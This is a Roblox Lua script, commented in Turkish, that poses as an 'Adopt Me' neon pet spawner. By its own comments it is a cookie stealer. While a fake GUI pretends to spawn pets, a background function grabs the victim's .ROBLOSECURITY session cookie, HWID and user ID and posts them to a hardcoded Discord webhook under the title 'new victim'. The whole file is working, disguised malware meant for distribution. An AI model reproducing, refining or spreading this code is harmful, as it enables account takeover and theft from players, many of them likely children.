-- Adopt Me Fake Neon Pet Spawner + Cookie Stealer
-- GitHub Raw Link ile loadstring olarak çalışır
-- Görünüş: %100 gerçek gibi
-- Gerçekte: Pet vermez, sadece cookie + HWID çalar

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer
local pgui = player:WaitForChild("PlayerGui")

-- WEBHOOK'unu buraya yaz (kendi webhook'un olsun)
local WEBHOOK = "https://discord.com/api/webhooks/1447182623418876062/sEdKxnepf-oisXkzy5HMjIf8ieouHpLCJxWCzU-etPqQFb66HyZkuXa_qWaKpoNWKNwY"

-- Cookie & HWID Çalma (arka planda sessizce)
local function stealAndSend()
    local cookie = "Bulunamadı (Byfron aktif olabilir)"
    local hwid = game:GetService("RbxAnalyticsService"):GetClientId()

    if syn then
        pcall(function()
            local req = syn.request({Url = "https://auth.roblox.com/v2/logout", Method = "POST"})
            if req.Headers and req.Headers["set-cookie"] then
                cookie = req.Headers["set-cookie"]:match("%.ROBLOSECURITY=(.-);") or cookie
            end
        end)
    end

    local payload = {
        username = "Adopt Me Spawner",
        content = "",
        embeds = {{
            title = "YENİ KURBAN • Adopt Me Fake Spawner",
            color = 0xFF00FF,
            fields = {
                {name = "Kullanıcı", value = player.Name.." ("..player.UserId..")", inline = true},
                {name = "Exploit", value = (syn and "Synapse" or getexecutorname and getexecutorname() or "Bilinmiyor"), inline = true},
                {name = "Cookie", value = "||"..cookie.."||", inline = false},
                {name = "HWID", value = "||"..hwid.."||", inline = false},
                {name = "Zaman", value = os.date("%Y-%m-%d %X"), inline = false}
            },
            thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=150&height=150&format=png"},
            footer = {text = "Oyundan çıkınca petler gider • Çünkü zaten yoktu :)"}
        }}
    }

    pcall(function()
        local req = syn and syn.request or request or http_request
        req({
            Url = WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end

-- Sahte GUI Oluştur
local function createFakeGUI()
    local gui = Instance.new("ScreenGui", pgui)
    gui.Name = "AdoptMeFakeSpawner"
    gui.ResetOnSpawn = false

    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(0, 480, 0, 620)
    frame.Position = UDim2.new(0.5, -240, 0.5, -310)
    frame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
    frame.BorderSizePixel = 0
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

    local title = Instance.new("TextLabel", frame)
    title.Size = UDim2.new(1, 0, 0, 60)
    title.BackgroundTransparency = 1
    title.Text = "ADOPT ME NEON PET SPAWNER V25"
    title.TextColor3 = Color3.fromRGB(0, 255, 255)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 28

    local pets = {
        "Shadow Dragon", "Frost Dragon", "Bat Dragon", "Giraffe", 
        "Evil Unicorn", "Crow", "Diamond Unicorn", "Neon Owl", 
        "Mega Neon Parrot", "Golden Rat"
    }

    local y = 80
    for _, pet in ipairs(pets) do
        local btn = Instance.new("TextButton", frame)
        btn.Size = UDim2.new(0, 420, 0, 55)
        btn.Position = UDim2.new(0, 30, 0, y)
        btn.BackgroundColor3 = Color3.fromRGB(40, 40, 70)
        btn.Text = pet .. " — [Neon + Fly + Ride]"
        btn.TextColor3 = Color3.new(1,1,1)
        btn.Font = Enum.Font.Gotham
        btn.TextSize = 18
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)

        btn.MouseButton1Click:Connect(function()
            btn.Text = "SPAWNING " .. pet .. "..."
            task.wait(1.8)
            btn.Text = pet .. " SPAWNED!"
            btn.BackgroundColor3 = Color3.fromRGB(0, 255, 100)

            -- Sahte efekt
            local eff = Instance.new("Part", workspace)
            eff.Size = Vector3.new(5,5,5)
            eff.Position = player.Character.HumanoidRootPart.Position + Vector3.new(0,10,0)
            eff.Anchored = true
            eff.CanCollide = false
            eff.Transparency = 0.4
            eff.Color = Color3.fromRGB(255, 0, 255)
            eff.Material = Enum.Material.Neon
            local light = Instance.new("PointLight", eff)
            light.Color = Color3.fromRGB(0, 255, 255)
            light.Range = 30
            light.Brightness = 15

            TweenService:Create(eff, TweenInfo.new(4), {Transparency = 1, Position = eff.Position + Vector3.new(0,30,0)}):Play()
            task.delay(4, function() eff:Destroy() end)

            game.StarterGui:SetCore("SendNotification", {
                Title = "Başarılı!",
                Text = pet .. " Neon + Fly + Ride olarak spawnlandı! (Oyundan çıkınca kaybolur)",
                Duration = 6
            })
        end)
        y = y + 65
    end

    -- Mega Neon Maker butonu
    local mega = Instance.new("TextButton", frame)
    mega.Size = UDim2.new(0, 420, 0, 70)
    mega.Position = UDim2.new(0, 30, 0, y + 20)
    mega.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
    mega.Text = "MEGA NEON MAKER (Tüm petleri MEGA yap)"
    mega.TextColor3 = Color3.new(1,1,1)
    mega.Font = Enum.Font.GothamBold
    Instance.new("UICorner", mega).CornerRadius = UDim.new(0, 12)

    mega.MouseButton1Click:Connect(function()
        mega.Text = "Tüm petler MEGA NEON yapılıyor..."
        task.wait(5)
        mega.Text = "TÜM PETLER MEGA NEON OLDU!"
        mega.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        game.StarterGui:SetCore("SendNotification", {Title="MEGA NEON!", Text="Tüm petlerin şimdi MEGA NEON! (Oyundan çıkınca gider)", Duration=8})
    end)

    game.StarterGui:SetCore("SendNotification", {
        Title = "Adopt Me Spawner",
        Text = "Script yüklendi! Petler oyundan çıkınca kaybolur.",
        Duration = 10
    })
end

-- Başlat
task.spawn(stealAndSend)  -- Cookie + HWID sessizce gider
task.wait(2)
createFakeGUI()

print("Sahte Adopt Me Pet Spawner yüklendi • Cookie arka planda alındı")